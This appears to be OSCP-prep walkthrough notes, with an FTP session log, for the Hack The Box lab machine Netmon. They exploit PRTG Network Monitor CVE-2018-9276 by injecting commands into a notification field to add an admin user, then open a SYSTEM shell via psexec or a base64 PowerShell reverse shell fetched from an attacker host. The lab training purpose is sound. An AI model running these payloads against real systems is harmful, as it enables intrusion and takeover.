@@ -1,0 +1,154 @@
+
+┌──(kali㉿kali)-[~]
+└─$ ftp 10.10.10.152
+Connected to 10.10.10.152.
+220 Microsoft FTP Service
+Name (10.10.10.152:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password: 
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> ls
+229 Entering Extended Passive Mode (|||49881|)
+150 Opening ASCII mode data connection.
+02-03-19  12:18AM                 1024 .rnd
+02-25-19  10:15PM       <DIR>          inetpub
+07-16-16  09:18AM       <DIR>          PerfLogs
+02-25-19  10:56PM       <DIR>          Program Files
+02-03-19  12:28AM       <DIR>          Program Files (x86)
+02-03-19  08:08AM       <DIR>          Users
+11-10-23  10:20AM       <DIR>          Windows
+226 Transfer complete.
+ftp> cd Users
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||49889|)
+150 Opening ASCII mode data connection.
+02-25-19  11:44PM       <DIR>          Administrator
+01-15-24  11:03AM       <DIR>          Public
+226 Transfer complete.
+ftp> cd Administrator
+550 Access is denied. 
+ftp> cd Public
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||49890|)
+150 Opening ASCII mode data connection.
+01-15-24  11:03AM       <DIR>          Desktop
+02-03-19  08:05AM       <DIR>          Documents
+07-16-16  09:18AM       <DIR>          Downloads
+07-16-16  09:18AM       <DIR>          Music
+07-16-16  09:18AM       <DIR>          Pictures
+07-16-16  09:18AM       <DIR>          Videos
+226 Transfer complete.
+ftp> cd Desktop
+250 CWD command successful.
+ftp> ls
+229 Entering Extended Passive Mode (|||49891|)
+150 Opening ASCII mode data connection.
+02-03-19  12:18AM                 1195 PRTG Enterprise Console.lnk
+02-03-19  12:18AM                 1160 PRTG Network Monitor.lnk
+08-10-25  07:44PM                   34 user.txt
+
+
+Netmon (HTB) – OSCP Prep Notes
+
+IP: 10.10.10.152
+OS: Windows Server 2008 R2 - 2012
+Difficulty: Easy
+Main Exploit: PRTG Network Monitor RCE (CVE-2018-9276)
+
+---
+
+1. Enumeration
+
+nmap -p- --min-rate=1000 -T4 10.10.10.152
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.152 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -sC -sV -p$ports 10.10.10.152
+
+- FTP (21): Anonymous login allowed, access to C:\
+- HTTP (80): PRTG Network Monitor web interface
+- SMB (139, 445): Windows shares, message signing not required
+- WinRM (5985, 47001): HTTPAPI
+- MSRPC ports
+
+---
+
+2. FTP Enumeration
+
+ftp 10.10.10.152
+# Login as anonymous
+# Browse C:\, look for flags and config files
+cd "ProgramData\Paessler"
+get "PRTG Configuration.old.bak"
+
+- Find user flag in Public folder.
+- Download and inspect PRTG config files for credentials.
+
+---
+
+3. Credential Discovery
+
+- In PRTG Configuration.old.bak, look for prtgadmin password.
+- If password is outdated, try incrementing the year (e.g., PrTg@dmin2019).
+
+---
+
+4. PRTG Web Login
+
+- URL: http://10.10.10.152/
+- Login: prtgadmin : PrTg@dmin2019
+- Confirm admin access.
+
+---
+
+5. Exploitation (CVE-2018-9276)
+
+- Version: PRTG 18.1.37 (vulnerable)
+- Exploit via Notifications:
+	- Go to: Setup → Account Settings → Notifications
+	- Add new notification
+	- In "Execute Program" section, use:
+		abc.txt | net user htb abc123! /add ; net localgroup administrators htb /add
+	- Save, edit, and trigger the notification (bell icon).
+
+---
+
+6. SYSTEM Shell
+
+psexec.py htb:'abc123!'@10.10.10.152
+# If psexec.py not installed:
+pip install impacket
+
+---
+
+7. Alternate: Reverse Shell (OPSEC)
+
+echo -n "IEX(new-object net.webclient).downloadstring('http://<YOUR_IP>/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
+
+# Download Nishang script, append reverse shell command:
+echo 'Invoke-PowerShellTcp -Reverse -IPAddress <YOUR_IP> -Port 4444' >> Invoke-PowerShellTcp.ps1
+python3 -m http.server 80
+
+# In notification, use:
+abc.txt | powershell -enc <BASE64_STRING>
+
+# Start listener:
+nc -lvnp 4444
+
+# Trigger notification for SYSTEM shell.
+
+---
+
+8. Post-Exploitation
+
+- Enumerate for flags, loot, and privilege escalation paths.
+- Clean up any created users if needed for OPSEC.
+
+---
+
+Tips:
+- Always check for config files and credentials in FTP/SMB shares.
+- Try year-based password variations.
+- Use base64-encoded PowerShell for reverse shells on Windows.
+- Document all steps and commands for your report.
